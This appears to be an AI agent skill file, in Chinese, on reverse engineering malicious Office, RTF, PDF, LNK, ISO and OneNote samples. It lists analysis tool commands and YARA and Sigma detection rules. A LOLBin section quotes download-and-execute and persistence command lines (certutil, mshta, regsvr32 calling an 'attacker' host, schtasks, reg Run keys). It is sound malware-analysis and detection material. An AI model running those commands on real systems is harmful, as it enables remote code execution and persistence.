---
name: document-macro-reverse-engineering
description: 文档与宏样本逆向。OLE 旧 doc/xls/ppt（olevba/oledump/olemap/oleobj）+ OOXML 新 docx/xlsx/pptx（unzip + vbaProject.bin）+ PDF（peepdf/pdf-parser/pdfid）+ RTF（rtfdump/rtfobj）+ LNK + ISO/IMG/VHD + OneNote .one + HTA / MSI / CHM / CPL / SCR；VBA stomping / XL4 macro / DDE / Equation Editor / LOLBin 调用 / payload 多阶段提取。配合 malrev / scriptrev / winrev 用。
---

# 文档 / 宏 样本逆向

## 适用场景

- 钓鱼附件分析：`.docx` / `.xlsx` / `.xlsm` / `.docm` / `.pptm` / `.rtf` / `.pdf` / `.lnk` / `.iso` / `.img` / `.vhd` / `.one` / `.html` / `.hta` / `.msi` / `.chm` 等。
- 文档投递的 multi-stage：第一阶段宏 / Equation Editor / 模板注入 → 拉 stage2（PowerShell / .NET dropper）。
- LNK 投递 / ISO 投递 / OneNote 投递 三大近年主流路径。
- LOLBin 滥用识别：`mshta` / `rundll32` / `regsvr32` / `certutil` / `bitsadmin` / `wmic` / `curl` / `powershell -enc`。
- Office Macro 检测规则编写（YARA / Sigma）。

## 不适用

- 宏拉下来的 stage2 二进制 → `malrev` / `binrev`。
- PowerShell / VBA 字节码级 → `scriptrev`。
- 加壳的 .NET dropper → `packrev`。
- 自家专有文档格式 → `fmtrev`。

## 文档格式速识

| 后缀 | 内部容器 | 识别 |
| --- | --- | --- |
| **.doc / .xls / .ppt** | OLE2 Compound | magic `D0 CF 11 E0 A1 B1 1A E1` |
| **.docx / .xlsx / .pptx / .docm / .xlsm** | OOXML = ZIP | magic `50 4B 03 04`，含 `[Content_Types].xml` |
| **.rtf** | 文本，含 `{\rtf1` | magic `7B 5C 72 74 66 31` (`{\rtf1`) |
| **.pdf** | 文本，含 `%PDF-1.x` | magic `25 50 44 46` (`%PDF`) |
| **.lnk** | 二进制 Shell Link | magic 头 `4C 00 00 00 01 14 02 00` |
| **.iso** | ISO 9660 / UDF | offset 0x8001 `CD001` |
| **.img / .vhd / .vhdx** | 磁盘镜像 | 多种 |
| **.one** | OneNote | magic `E4 52 5C 7B 8C D8 A7 4D AE B1 53 78 D0 29 96 D3` |
| **.hta** | HTML Application | `.html` 用 `mshta.exe` 启动 |
| **.msi** | Windows Installer (OLE2) | OLE2 magic |
| **.cab** | Cabinet | magic `4D 53 43 46` (`MSCF`) |
| **.chm** | Compiled HTML Help | magic `49 54 53 46` (`ITSF`) |
| **.cpl / .scr** | 实际是 PE | 直接 PE 分析 |
| **.xll** | Excel 加载项 (PE DLL) | PE magic |
| **.svg** | XML | 可嵌入 JavaScript 触发 |
| **.iqy** | Excel Web Query | 文本 |
| **.pub** | Microsoft Publisher OLE | OLE2 magic |

```bash
file unknown.bin                                            # 起手
xxd unknown.bin | head -3
strings -el unknown.bin | head -20
trid unknown.bin
exiftool unknown.bin
```

## oletools 全套（OLE / OOXML / VBA）

```bash
pip install oletools

# 1) 起手 - 识别 + 危险关键字
oleid sample.doc                                            # OLE/OOXML 概览 + 风险标志
olevba sample.doc                                           # VBA 源 + 自动反混淆 + IOC 表
olevba --decode sample.doc                                  # 多解一层 Hex/Base64/Dridex/StrReverse
olevba --reveal sample.doc                                  # 显示函数调用图
olevba --analysis sample.doc                                # 全 IOC + 危险 API 表
olevba --no-deobf sample.doc                                # 不反混淆，看原始
olevba -j sample.doc > analysis.json                        # JSON 输出

# 输出关键字段:
#   AutoExec        Auto_Open / Document_Open / Workbook_Open / AutoExec 触发
#   Suspicious      Shell / WScript.Shell / Win32_Process / CreateObject / Open / Save
#   IOCs            URL / IP / Email / 文件名 / 注册表键

# 2) OLE 流 dump
oledump.py sample.doc                                       # 列所有流（含 VBA 容器）
# 输出例:
#   1: 114 '\x01CompObj'
#   2: 4096 '\x05DocumentSummaryInformation'
#   3: 4096 '\x05SummaryInformation'
#   4: 1024 '1Table'
#   5: 4276 'WordDocument'
#  M6: 1023 'Macros/VBA/ThisDocument'                       ← M 标志 = VBA 宏存在

oledump.py sample.doc -s M6 -v                              # dump VBA 流 + decompress
oledump.py sample.doc -s 4 -d > stream4.bin                 # raw dump

# YARA 跨流扫
oledump.py sample.doc -y rules.yar
# 含 stream 偏移 + 命中行号

# 3) OLE 结构 / 头
olemap sample.doc                                           # 显示 OLE FAT / MiniFAT / 流目录结构
oledir sample.doc                                           # 简化目录树

# 4) OLE Object 提取（嵌入对象）
oleobj sample.doc                                           # 提出内嵌的 OLE Object（Package / Equation）
# 常见: package_*.tmp / equation.bin / dropper.exe

# 5) Stream 5 (\x05DocumentSummaryInformation / \x05SummaryInformation)
# 包含 author / lastmodifiedby / company / template / create_time / last_save_time
olemeta sample.doc                                          # 元数据
```

### VBA 反混淆典型套路

```text
样本常见混淆:
1) 字符串反转: StrReverse("evt.tsoh") -> "host.tve"
2) Chr/CDec 拼接: Chr(72) & Chr(101) -> "He"
3) Hex/Base64: 嵌大段 Hex 字符串解码到 byte array
4) 数学嵌套: Asc(c) Xor key, 累加器
5) 字典替换: Dim a(): a(1)="cmd": a(2)="powershell"
6) WScript.Shell 通过 GetObject("new:") 间接调用
7) 反射调用 .NET: Application.Run(CallByName(...))
8) Form 控件内藏字符串（不在源码可视区，藏在表单属性里）

olevba --decode 把上面前 6 种自动解开
对付 8 (Form 控件) -> 用 oledump 看 Form 流 / 用 oletools-form-helper
```

### VBA Stomping 识别

```text
VBA 源代码 + p-code 可以独立存在，攻击者改源代码 -> 看着干净，但 p-code 仍含原恶意逻辑
"Stomping" = 抹除源代码，只留 p-code

检测:
pcodedmp sample.doc                                         # github.com/bontchev/pcodedmp
  反汇编 VBA p-code，绕过被 stomp 的源
pcode2code sample.doc                                       # p-code → 伪 VBA 重建源
olevba --reveal sample.doc | grep -i 'pcode'

# 源 vs p-code 一致性检查
olevba sample.doc | grep -i 'mismatch\|stomp'
```

## OOXML（docx / xlsx / pptx）

```bash
# 本质是 zip
unzip -d unpacked sample.docx
ls unpacked/
# 核心结构:
#   [Content_Types].xml         MIME 映射
#   _rels/.rels                 顶层关系
#   word/document.xml           主文档体
#   word/_rels/document.xml.rels 引用关系（含外链 / 模板）
#   word/vbaProject.bin         VBA 宏 (docm/xlsm)
#   xl/workbook.xml             Excel 工作簿
#   xl/sharedStrings.xml        字符串表（恶意码常藏这里）
#   xl/externalLinks/           外链（远程模板 / 自动拉取）

# 反编译宏
oledump.py unpacked/word/vbaProject.bin
oledump.py unpacked/xl/vbaProject.bin

# 远程模板注入（template injection）— 主流投递手段
xmllint --format unpacked/word/_rels/settings.xml.rels
# 找 <Relationship Target="http://attacker.com/template.dotm" ...> = 红旗

# 外链 / 远程图片 (single pixel beacon)
xmllint --format unpacked/word/document.xml | grep -iE 'http|https|external' | head

# Sharepoint / OneDrive 链接（合法但常见钓鱼 staging）
grep -RE 'https?://' unpacked/ | head -20

# DDE (Dynamic Data Exchange)
grep -RE 'DDEAUTO|DDE ' unpacked/                            # 老式 DDE 链接
# 例: <w:fldSimple w:instr=" DDEAUTO &quot;C:\\Windows\\System32\\cmd.exe&quot; ..."

# Field code 注入
grep -RE 'fldSimple|fldChar' unpacked/word/document.xml | head

# 嵌入对象
ls unpacked/word/embeddings/                                 # 内嵌 OLE Object
oledump.py unpacked/word/embeddings/oleObject1.bin
oleobj unpacked/word/embeddings/oleObject1.bin
```

## RTF

```bash
# rtfdump (Didier Stevens)
rtfdump.py sample.rtf                                       # 列对象（嵌入 OLE / 图片 / 控制字）
rtfdump.py sample.rtf -s 5 -d > obj5.bin                    # dump 对象 5
rtfdump.py sample.rtf -p ascii                              # ASCII 模式
rtfdump.py sample.rtf -E -O                                 # 提对象 + decode

# rtfobj (oletools) - 自动提 OLE 对象 + Equation Editor
rtfobj sample.rtf                                           # 列对象
rtfobj -s 1 sample.rtf -e ./out/                            # 提取对象 1 到 out/

# Equation Editor (CVE-2017-11882 / CVE-2018-0802) 识别
strings sample.rtf | grep -i 'EQNEDT32\|Microsoft Equation'

# 常见 RTF 投递特征
grep -aE '\\objclass|\\objupdate|\\objemb|\\datastore' sample.rtf | head
grep -aE 'objdata' sample.rtf
# 大段 hex 跟在 \\objdata 后面 = 嵌入 OLE 对象

# 解 \\objdata 后的 hex → 喂 oledump
rtfobj -d -e out/ sample.rtf
oledump.py out/object_*.bin

# RTF 模板注入：
# 内嵌或远程拉 .dotm（与 docx remote template 类似）
grep -i 'http' sample.rtf | head
```

## PDF

```bash
# pdfid (识别危险关键字)
pdfid.py sample.pdf
# 关键字段（重点关注 > 0 的）:
#   /JS / /JavaScript          JavaScript
#   /AA / /OpenAction          自动执行
#   /Launch                    启动外部程序
#   /URI                       外链
#   /SubmitForm / /GoToR       提交 / 跳转远程
#   /AcroForm / /XFA           表单
#   /RichMedia / /Flash        富媒体
#   /EmbeddedFile              内嵌文件

# pdf-parser (逐对象浏览)
pdf-parser.py sample.pdf
pdf-parser.py sample.pdf --search javascript
pdf-parser.py sample.pdf -o 5 -f -w                         # 对象 5, filter 解开, raw
pdf-parser.py sample.pdf --object 5 --filter --raw > obj5.bin
pdf-parser.py sample.pdf --stats                            # 全统计

# peepdf (交互式 + 自动检测)
peepdf -i sample.pdf
PPDF> info
PPDF> tree
PPDF> stream 5
PPDF> js_code 5                                             # 提 stream 中 JS
PPDF> vt                                                    # VirusTotal 查

# qpdf (修复 + qpdf-json)
qpdf --json sample.pdf > sample.json
qpdf --qdf sample.pdf decoded.pdf                           # decode 所有 stream，方便看
qpdf --check sample.pdf

# mupdf / mutool
mutool info sample.pdf
mutool extract sample.pdf                                   # 提所有嵌入文件

# JS 提取后单独反混淆
pdf-parser.py sample.pdf -f -w --object N > script.js
# 喂 js-beautify / box-js / synchrony
js-beautify script.js
box-js script.js --output-dir=./trace/

# 已知漏洞模式
# - CVE-2010-0188 (LibTIFF in PDF)
# - CVE-2018-4990 (JBIG2)
# - CVE-2018-15981 (Adobe ECMAScript)
# - CVE-2023-26369 (Acrobat)
```

## LNK

```bash
# lnkparse / pylnk3
pip install pylnk3 lnkparse3

lnkparse sample.lnk                                         # 完整解析
python3 -m pylnk3 parse sample.lnk

# 关键字段
#   CommandLineArguments     ← 这里常藏 powershell -enc / cmd /c
#   RelativePath             ← 假装合法（pdf.exe / docx.exe）
#   IconLocation             ← 图标欺骗
#   WorkingDirectory
#   MachineIdentifier        ← 制作机器名（OPSEC 残留）
#   DriveSerialNumber        ← 制作磁盘序列号
#   TargetFileSize
#   CreationTime / WriteTime / AccessTime

# 大量样本：诱饵 .pdf.lnk / .docx.lnk
# 启动 cmd.exe /c "find /v /c x sample.lnk & call ..."
# 或 mshta.exe http://attacker/page.hta

# EvilLnkScrubber: 删除制作者元数据（红队工具，识别用）
# https://github.com/optiv/Mangle/tree/master/static
```

## ISO / IMG / VHD（容器型投递）

```bash
# ISO: 标准光盘镜像
file sample.iso
isoinfo -l -i sample.iso                                    # 列内容
7z l sample.iso                                             # 用 7z 解
7z x sample.iso -o./extracted/
mkdir mnt && sudo mount -o loop,ro sample.iso mnt/

# IMG (FAT/NTFS/ext): 同上
file sample.img
file -k sample.img                                          # 不停在第一个
fdisk -l sample.img                                         # 分区表
losetup -fP sample.img                                      # 设 loop
mount /dev/loop0p1 mnt/

# VHD / VHDX
qemu-img info sample.vhd
qemu-img convert -f vhd -O raw sample.vhd sample.raw
losetup -fP sample.raw
mount /dev/loop0p1 mnt/

# 7z 对 VHD/VHDX 也行
7z l sample.vhdx
7z x sample.vhdx

# 关键: ISO/IMG 投递的"伎俩" - 绕 MOTW (Mark of the Web)
# 用户点 ISO/IMG，Windows 自动 mount，里面的 PE/LNK 不带 MOTW → 直接运行
# 反制：建检测规则 / 看是否含 PE/LNK
```

## OneNote .one

```bash
# oletools 含 onenote 解析（新版）
olevba --analysis sample.one                                # 部分支持
oledump.py sample.one                                       # 列 stream

# 专门工具
# onedump.py (Didier Stevens)
git clone https://github.com/DidierStevens/Beta
python3 Beta/onedump.py sample.one                          # 列 OneNote 内嵌对象

# pyOneNote (社区)
pip install pyOneNote
python3 -m pyOneNote.OneDocument sample.one

# 关键: OneNote 不像 Office，无 Protected View，2022-2023 大量样本
# 内嵌任意 .exe / .hta / .vbs / .bat 直接 double-click 跑
# 检测: olevba ​--analysis 列出 embedded executable
```

## MSI / CAB / CHM / HTA / XLL

```bash
# MSI = OLE2 + Install DB
oledump.py sample.msi
msiinfo tables sample.msi
msiinfo export sample.msi CustomAction > ca.idt              # CustomAction 表 = 安装时执行的命令
lessmsi x sample.msi                                         # 解压所有文件
7z l sample.msi
7z x sample.msi

# CAB
7z l sample.cab
7z x sample.cab
cabextract sample.cab

# CHM
7z l sample.chm
7z x sample.chm                                              # 解出 HTML + JS
extract_chmLib sample.chm                                    # 老牌

# HTA = HTML 但 IE/mshta 沙箱外
cat sample.hta
# 直接读 → 关注 <script>, ActiveXObject, WScript.Shell, Eval

# XLL = Excel Add-in = PE DLL
file sample.xll
# 当 PE/DLL 分析 → 函数 xlAutoOpen / xlAutoClose 是入口
strings sample.xll | grep -iE 'xlAutoOpen|xlfRegister'
# 直接 IDA / Ghidra
```

## LOLBin 调用识别

```text
样本绕开 PE 直接调用系统自带工具完成攻击，关键字（LOLBAS 项目）：

下载执行:
  certutil -urlcache -split -f http://... out.exe
  bitsadmin /transfer /download http://... out.exe
  curl http://... -o out.exe (Win10+ 自带)
  powershell -c iwr http://... -OutFile out.exe
  mshta http://attacker/page.hta
  wmic /node:127.0.0.1 process call create "..."
  
执行任意代码:
  rundll32.exe shell32.dll,Control_RunDLL <dll>             # 执行 DLL
  regsvr32.exe /s /n /u /i:http://attacker/sct.sct scrobj.dll
  installutil.exe /U sample.exe                             # .NET 入口
  msbuild.exe sample.proj                                   # XAML 任意 .NET
  msxsl.exe input.xml transform.xsl
  wmiexec.exe / wmic.exe ...
  
持久化 / 提权:
  schtasks /create /sc minute /mo 1 /tn task /tr "cmd /c ..."
  sc create svc binPath= "..."
  reg add HKCU\...\Run /v key /t REG_SZ /d "..."

参考:
  LOLBAS:           https://lolbas-project.github.io
  GTFOBins (Linux): https://gtfobins.github.io
  LOLDrivers:       https://www.loldrivers.io  (内核驱动滥用)

检测 (Sigma 例子):
  process_creation:
    Image|endswith: '\certutil.exe'
    CommandLine|contains: '-urlcache'
    CommandLine|contains: 'http'
```

## 沙箱与动态触发

```bash
# 沙箱 (与 malrev 重叠) — 文档样本走特殊配置
# CAPE / Cuckoo: 选 Windows + Office 镜像 + 已装 Office 版本
# any.run: 交互式打开文档 + 启用宏 + 手动触发
# triage: 自动跑 + 行为分类
# Joe Sandbox: 文档专项报告

# 本地手动观察
# 装 office （隔离 VM）
# Sysmon + ProcMon 全开
# Wireshark + 假 DNS (FakeNet-NG)
# 打开样本 → 启用宏 → 看 process tree + 网络

# 文档 → 子进程链常见
# WINWORD.EXE -> cmd.exe -> powershell.exe -> rundll32.exe -> ...
# 或      EXCEL.EXE -> mshta.exe -> wscript.exe -> ...

# 文档 → 网络
# 加载远程模板 / OneDrive link / Sharepoint link 出来下 stage2
```

## YARA 规则模板

```yara
rule Office_Macro_Suspicious {
    meta:
        author = "team"
        date = "2024-04-15"
    strings:
        $magic_ole = { D0 CF 11 E0 A1 B1 1A E1 }
        $magic_ooxml = { 50 4B 03 04 }
        $autoexec1 = "Auto_Open" ascii nocase
        $autoexec2 = "Workbook_Open" ascii nocase
        $autoexec3 = "Document_Open" ascii nocase
        $shell1 = "WScript.Shell" ascii nocase
        $shell2 = "Wscript.Shell" wide nocase
        $shell3 = "powershell" nocase
        $down1 = "MSXML2.XMLHTTP" nocase
        $down2 = "Microsoft.XMLHTTP" nocase
        $down3 = "InternetExplorer.Application" nocase
        $shellcode = { (90 90 90 90 | 31 c0 50 68) }
    condition:
        ($magic_ole at 0 or $magic_ooxml at 0)
        and 1 of ($autoexec*)
        and 2 of ($shell*, $down*)
}

rule LNK_PowerShell_Dropper {
    strings:
        $lnk_magic = { 4C 00 00 00 01 14 02 00 }
        $ps1 = "powershell" nocase
        $enc = "-enc" nocase
        $cmd = "cmd.exe" nocase
    condition:
        $lnk_magic at 0 and ($ps1 or ($cmd and any of ($enc)))
}

rule OneNote_Embedded_Executable {
    strings:
        $one = { E4 52 5C 7B 8C D8 A7 4D AE B1 53 78 D0 29 96 D3 }
        $pe = "MZ"
        $hta = ".hta" nocase
        $vbs = ".vbs" nocase
        $bat = ".bat" nocase
    condition:
        $one at 0 and any of ($pe, $hta, $vbs, $bat)
}
```

## 实战入口

- **Didier Stevens blog**：oledump / rtfdump / pdfid 作者，每周一篇深度。
- **OALabs YouTube + Patreon**：文档样本逆向系列。
- **DFIR Diva blog**：入门 DFIR 路径含文档分析。
- **MalwareBazaar 文档标签**：海量样本免费下载。
- **The DFIR Report**：实际案例链含文档投递。
- **InQuest / VMRay / Intezer / Sophos labs blog**：文档样本深度报告。
- **Practical Malware Analysis 第 19 章 + 附录**。
- **CyberChef**：Hex/Base64/XOR 一键解链。
- **awesome-malware-analysis GitHub list**。

## 自检（拿到文档样本 30 分钟内回答）

1. 文件类型 / 容器（OLE / OOXML / RTF / PDF / LNK / ISO / OneNote）？
2. 触发方式（AutoOpen / Workbook_Open / OAA / OpenAction / Equation Editor / Template Injection）？
3. 是否有 VBA Stomping（源码与 p-code 不一致）？
4. 调哪些危险 API（CreateObject / WScript.Shell / Shell / URLDownloadToFile）？
5. C2 / staging URL / IP / 域名？
6. Stage2 是什么（PowerShell / .NET / EXE / hta / vbs）？
7. LOLBin 链条（哪个进程链 → 父子关系）？
8. 制作者元数据（author / lastSavedBy / CreationTime / 模板路径 / 机器名）？
9. YARA + Sigma 规则能写出吗？

## 相邻技能

- `malrev` — 文档样本的家族归并与全链路画像。
- `scriptrev` — VBA / VBE / PowerShell / JS 字节码层。
- `winrev` — Office 进程链 + LOLBin 在 Windows 上的执行模型。
- `packrev` — Stage2 .NET / native 加壳。
- `binrev` — Stage2 PE / Mach-O / ELF 函数级。
- `cryptrev` — VBA / PowerShell 中的 XOR / Base64 / AES 字符串解密。
- `fmtrev` — 自家文档格式 / 私有容器。
- `protrev` — C2 协议（HTTP / DNS / SMB）。
- `cloudrev` — 滥用 Microsoft 365 / OneDrive / SharePoint 作为 staging。
- `memrev` — 文档运行后内存中的 stage 重组。